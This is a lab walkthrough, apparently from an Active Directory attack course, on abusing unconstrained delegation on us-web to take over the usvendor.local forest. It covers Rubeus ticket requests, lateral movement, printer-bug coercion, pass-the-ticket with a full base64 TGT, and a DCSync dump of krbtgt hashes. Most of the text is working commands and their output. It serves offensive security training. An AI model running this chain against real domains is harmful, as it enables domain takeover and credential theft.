Task
•  Abuse the Unconstrained Delegation on us-web to get Enterprise Admin privileges on usvendor.local.


如果跨森林信任启用 TGT 委派，我们也可以在双向森林信任之间滥用printer bug


1. 开启一个webmaster的cmd进程
```
C:\AD\Tools\Rubeus.exe asktgt /domain:us.techcorp.local /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

2. 拷贝Rubeus.exe到us-web

```
echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\Public\Rubeus.exe /Y
```

3. 横向到us-web，在us-web开启监听

```
C:\Windows\system32>winrs -r:us-web cmd.exe
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\webmaster>C:\Users\Public\Rubeus.exe monitor /targetuser:usvendor-dc$ /interval:5 /nowrap
C:\Users\Public\Rubeus.exe monitor /targetuser:usvendor-dc$ /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1

[*] Action: TGT Monitoring
[*] Target user     : usvendor-dc$
[*] Monitoring every 5 seconds for new TGTs
```

4. 在学生机，强制usvendor-dc向us-web认证

```
C:\AD\Tools\MS-RPRN.exe \\usvendor-dc.usvendor.local \\us-web.us.techcorp.local
```

us-web收到usvendor-dc的tgt
```
[*] 11/5/2022 1:40:44 AM UTC - Found new TGT:

  User                  :  USVENDOR-DC$@USVENDOR.LOCAL
  StartTime             :  11/4/2022 2:05:46 PM
  EndTime               :  11/5/2022 12:05:32 AM
  RenewTill             :  11/11/2022 1:05:32 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 1
```

5. ptt上面的tgt

```
PS C:\Windows\system32> C:\AD\Tools\Rubeus.exe ptt /ticket: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

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

查看klist
```
PS C:\Windows\system32> klist

Current LogonId is 0:0x1920aa0

Cached Tickets: (1)

#0>     Client: USVENDOR-DC$ @ USVENDOR.LOCAL
        Server: krbtgt/USVENDOR.LOCAL @ USVENDOR.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 11/4/2022 14:05:46 (local)
        End Time:   11/5/2022 0:05:32 (local)
        Renew Time: 11/11/2022 14:05:32 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

6. DCSync usvendor.local 的krbtgt

```
PS C:\Windows\system32> C:\AD\Tools\SharpKatz.exe --Command dcsync --User usvendor\krbtgt --Domain usvendor.local --DomainController usvendor-dc.usvendor.local
[*]
[*]                     System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 17763         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[!] usvendor.local will be the domain
[!] usvendor-dc.usvendor.local will be the DC server
[!] usvendor\krbtgt will be the user account
[*]
[*] Object RDN           : krbtgt
[*]
[*] ** SAM ACCOUNT **
[*]
[*] SAM Username         : krbtgt
[*] User Principal Name  :
[*] Account Type         : USER_OBJECT
[*] User Account Control : ACCOUNTDISABLE, NORMAL_ACCOUNT
[*] Account expiration   : 12/31/9999 11:59:59 PM
[*] Password last change : 7/12/2019 10:09:18 PM
[*] Object Security ID   : S-1-5-21-2028025102-2511683425-2951839092-502
[*] Object Relative ID   : 502
[*]
[*] Credents:
[*] Hash NTLM            : 335caf1a29240a5dd318f79b6deaf03f
[*] ntlm- 0              : 335caf1a29240a5dd318f79b6deaf03f
[*] lm  - 0              : f3e8466294404a3eef79097e975bda3b
[*]
[*] Supplemental Credents:
[*]
[*]  * Primary:NTLM-Strong-NTOWF
[*]     Random Value : 11d7fc894b21e11d24a81c7870eb8aae
[*]
[*]  * Primary:Kerberos-Newer-Keys
[*]     Default Salt :USVENDOR.LOCALkrbtgt
[*]     Credents
[*]     aes256_hmac       4096: 2b0b8bf77286337369f38d1d72d3705fda18496989ab1133b401821684127a79
[*]     aes128_hmac       4096: 71995c47735a10ea4a107bfe2bf38cb6
[*]     des_cbc_md5       4096: 982c3125f116b901
[*]     ServiceCredents
[*]     OldCredents
[*]     OlderCredents
[*]
[*]  * Primary:Kerberos
[*]     Default Salt :USVENDOR.LOCALkrbtgt
[*]     Credents
[*]     des_cbc_md5       : 982c3125f116b901
[*]     OldCredents
[*]
[*]  * Packages
[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos WDigest
[*]
[*]  * Primary:WDigest
[*]     01 99585c6025e58e1ac33c85f8a9ff8d18
[*]     02 c8dd05c8afc5d2b401e42ee135e7322f
[*]     03 b8ada0a86cd88445cea44dc839be89e2
[*]     04 99585c6025e58e1ac33c85f8a9ff8d18
[*]     05 c8dd05c8afc5d2b401e42ee135e7322f
[*]     06 f1a9058fe1f96297d9358a6ee70f3d0a
[*]     07 99585c6025e58e1ac33c85f8a9ff8d18
[*]     08 3e9f24f6600eb0613abf6a827e1579b4
[*]     09 3e9f24f6600eb0613abf6a827e1579b4
[*]     10 b31d574308dfbfc7359959269c9e062f
[*]     11 1e1b957757cfb97ea2cb6abaa00d37e4
[*]     12 3e9f24f6600eb0613abf6a827e1579b4
[*]     13 4c60e3254aa38c7eab2cc87ee5936665
[*]     14 1e1b957757cfb97ea2cb6abaa00d37e4
[*]     15 35105693dc1e8604a2e6d83fc4df54d5
[*]     16 35105693dc1e8604a2e6d83fc4df54d5
[*]     17 ce56ccf6a0d06664c7283ba6ab6f45b5
[*]     18 d6724265605922c57a12aae62411cddf
[*]     19 398eadef9fd48e9dd8574597d99a5e1e
[*]     20 50bcfec6ba9dd547d848b6795597fc66
[*]     21 5415bba00be1f4d402e290b87a5dc0a4
[*]     22 5415bba00be1f4d402e290b87a5dc0a4
[*]     23 040c18e4aa28bb2aeca69502bd1ce9da
[*]     24 fdd7b9a41f5392c5850c447dc26524a5
[*]     25 fdd7b9a41f5392c5850c447dc26524a5
[*]     26 3e58897c36a6045ceda494ecf08da9d9
[*]     27 689dca94f881ecba2ce4a13a1c9d2a26
[*]     28 0864b3b7df08ba05d95c877570a62ef7
[*]     29 7daa8ba2616ae1f75d9a7e9fe6cddc17
```